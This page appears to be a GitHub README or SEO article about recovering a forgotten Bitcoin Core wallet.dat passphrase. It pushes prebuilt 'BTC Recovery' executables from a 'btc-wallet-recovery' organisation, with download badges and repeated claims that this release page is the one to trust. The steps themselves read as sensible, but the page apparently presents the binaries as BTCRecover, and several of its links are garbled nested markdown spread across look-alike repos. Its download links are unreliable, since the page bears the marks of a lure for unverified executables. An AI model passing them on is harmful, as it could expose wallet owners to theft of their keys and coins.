<div align="center">
<img src="assets/banner-article.png" alt="wallet.dat password recovery for Bitcoin Core">
</div>

# wallet.dat password recovery for Bitcoin Core

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A `wallet.dat` file is Bitcoin Core's wallet, encrypted with a password you chose at some point; it cannot be reset, but it can be searched. BTCRecover tests candidate passwords locally against a copy of that file  -  typo variants, remembered fragments, pattern lists  -  and reports any candidate that opens it, so the file never leaves your machine.

## You'll see this if

The file is there, Core asks for a passphrase, and the passphrase is not the one you are typing. Four states cover almost every case, and they differ in what is actually wrong.

| What you see | What it means | What to do |
|---|---|---|
| Core opens the wallet read-only and reports an incorrect passphrase when you try to send | the file is intact and the password is wrong | search the password |
| Core opens the wallet and shows the right addresses, but spending asks for a passphrase you do not have | same case, and the addresses confirm you have the right file | search the password |
| You are not sure which `wallet.dat` is the right one | backups folder holds dated copies | compare addresses in each |
| The balance is fine but you want the private keys out | a key export, not a lost password | that is a different task, and it still needs the passphrase |

The distinction that matters: an encrypted Core wallet still shows its addresses without the passphrase. Only spending requires it. That is how you confirm you are looking at the right file before spending a night searching it.

## Why it happens

Bitcoin Core encrypts the private keys inside the wallet file, in place. The file stays readable as a wallet  -  addresses, transaction history  -  but the keys are wrapped with a key derived from your passphrase, and nothing in the file records or hints at what that passphrase was.

There is no reset because there is no escrow. Nobody holds a copy: not the project, not a server, not a support desk. This is the same design that makes the wallet yours, and it is why the answer to "I forgot my passphrase" is always a search rather than a request.

A wallet password is also not a seed phrase. The phrase regenerates a wallet from nothing; the password unwraps keys that are already sitting in the file. That difference decides what is possible: with a phrase, the wallet comes back even if the file is gone; without one, the file is the only thing that can be searched.

## Fix

Copy the wallet first, confirm it is the right one by its addresses, then rebuild the password from what you remember and test it locally against the copy.

1. **Stop Bitcoin Core before touching anything**, then copy the whole data directory. That directory holds the wallet, its backups and the chain state, and a clean copy is your fallback if a run goes wrong.
2. **Confirm the file is the wallet you think it is.** Open it read-only and compare the addresses with a record you trust  -  an old receive address, a statement, a screenshot. A search against the wrong file can never succeed.
3. **Check the `backups` folder for dated copies.** An older copy with the same addresses is just as usable, and sometimes the password you remember belongs to the older one.
4. **Write down everything you remember about the passphrase**: approximate length, words or names, numbers that could be dates, casing habits, substitutions, whether it was typed on a different keyboard layout, and the year it was set.
5. **Express that as rules.** A token list of the words and years you actually used, with a pattern allowing case variants, a separator and one or two digits, is a space small enough to finish. A "rough idea" of the password is genuinely useful input here: [Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md) shows how the rules are written.
6. **Download the current release from the GitHub releases page and run it offline** against the copied file: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
7. **Verify, then move the coins.** Open the recovered wallet in a fresh install, confirm the balance, send it to a wallet with a passphrase you have recorded, and keep the old file as an archive rather than as your main wallet.

Two practical details save time. Run on a copy so a failed attempt never risks the original, and let the tool work through the candidate space rather than editing rules every few minutes  -  each restart begins again from the start of the list.

## If that did not work

A completed run with no hit almost always means the wrong file, the wrong rules, or a passphrase that shared almost nothing with the memory you started from.

Check the file first: if the addresses in the copy are not the ones you expected, the best password in the world will not open it. Then widen the rules in the cheapest direction  -  case variants before extra words, a two-digit year before four, one punctuation mark before several. If the passphrase might have been typed with a keyboard layout that differed from today's, or with a trailing space, add that as a rule rather than a new search. [A run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) covers the four inputs in the order that costs least to test.

One case has no password answer: a wallet file from a very old Core build that was never encrypted. There is nothing to search, but there is also nothing blocking you  -  open it in a current install and the keys are readable.

## Prevention

- Encrypt new wallets, write the passphrase in a password manager, and store that manager's recovery code offline.
- Keep the encrypted wallet backed up in two places; a corrupted file cannot be searched at all.
- Record which address belongs to which wallet file, so a future you can identify a copy in seconds.
- Test that the file opens after any move, restore or upgrade.
- Never share the file or the passphrase with anyone offering to unlock it: BTCRecover is actively maintained, and the current release  -  the one to run  -  is published on the GitHub releases page.

## FAQ

### What is a wallet.dat file?

It is Bitcoin Core's wallet: a database holding your keys, the addresses derived from them and the transaction history. It is a file on your disk, not an account, so backing it up and keeping it readable is entirely your responsibility.

### How do I recover my Bitcoin Core wallet.dat file?

If the file itself is missing, restore it from a backup of the data directory  -  that is a file-recovery problem, not a password one. If the file exists and the passphrase does not, the file needs no recovery at all: only the passphrase has to be found.

### How can I recover my Bitcoin Core passphrase?

Rebuild it rather than recall it: length, words, dates, habits and the year it was set, expressed as candidate rules and tested locally against a copy of the wallet. In Core's own language the passphrase is the wallet password, so a Bitcoin Core passphrase recovery is a wallet-password search.

### How can I retrieve my passphrase?

Only by producing it: there is no lookup, no hint stored in the file and no support route that returns it. Any service claiming to retrieve a passphrase for you is asking for the wallet, which is the same as asking for the coins.

### Is there a wallet.dat password recovery tool?

Yes  -  this project. It reads a copy of the wallet, generates candidates from your rules and tests them offline, reporting a hit when one opens the file. Recovery of a wallet password is exactly the job it was built for: [Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md).

### How do I retrieve my wallet password if I only half-remember it?

Treat the half you remember as the specification: the words, the approximate length, the digits and the punctuation you would have used. That turns an impossible guess into a bounded list, and a bounded list is what a local search can finish.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Bitcoin wallet password recovery tool]([Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md))
- [Token lists and password patterns]([Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md))
- [BTCRecover command-line options]([BTCRecover command-line options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md))
- [A private key is not a seed phrase]([A private key is not a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/private-key-vs-seed-phrase-btcrecover.md))
